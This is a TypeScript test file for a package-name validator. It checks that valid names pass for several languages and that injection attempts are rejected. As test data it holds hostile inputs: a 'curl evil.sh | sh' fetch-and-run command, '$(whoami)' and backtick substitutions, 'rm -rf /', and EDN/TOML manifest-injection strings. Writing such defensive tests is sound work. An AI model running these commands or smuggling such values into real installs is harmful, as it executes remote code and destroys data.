import assert from 'node:assert';
import { validatePackages } from './validate-packages.ts';

assert.doesNotThrow(() => validatePackages('python', ['numpy', 'numpy==1.26.0']));
assert.throws(() => validatePackages('python', ['numpy>=1.0'])); // ranges rely on shell-meaningful chars
assert.throws(() => validatePackages('python', ['numpy[extra]'])); // extras rely on shell-meaningful chars

assert.doesNotThrow(() =>
	validatePackages('typescript', ['lodash', 'lodash@4.17.21', '@scope/pkg@^1.2.3', '@scope/pkg@~1.2.3'])
);

assert.doesNotThrow(() => validatePackages('clojure', ['hiccup', 'org.clojure/data.json@2.5.0']));
assert.throws(() => validatePackages('clojure', ['pkg} :aliases {:x {:exec-fn eval}}'])); // edn structure injection

assert.doesNotThrow(() => validatePackages('rust', ['rand', 'num-bigint@0.4', 'itertools@^0.13.0']));
assert.throws(() => validatePackages('rust', ['rand@0.8"\n[patch.crates-io]\nx = "y'])); // toml structure injection
assert.throws(() => validatePackages('rust', ['my crate']));

// Compiled straight from a source file — no manifest to put a dependency in
for (const language of ['cpp', 'assembly'] as const) {
	assert.doesNotThrow(() => validatePackages(language, []));
	assert.throws(() => validatePackages(language, ['boost']));
}

assert.throws(() => validatePackages('ruby' as never, [])); // unknown language, not a silent pass
assert.throws(() => validatePackages('constructor' as never, [])); // inherited prototype key is not a language

for (const language of ['python', 'typescript', 'clojure', 'rust'] as const) {
	assert.throws(() => validatePackages(language, ['x; curl evil.sh | sh']));
	assert.throws(() => validatePackages(language, ['$(whoami)']));
	assert.throws(() => validatePackages(language, ['pkg `id`']));
	assert.throws(() => validatePackages(language, ['pkg && rm -rf /']));
}

console.log('ok');
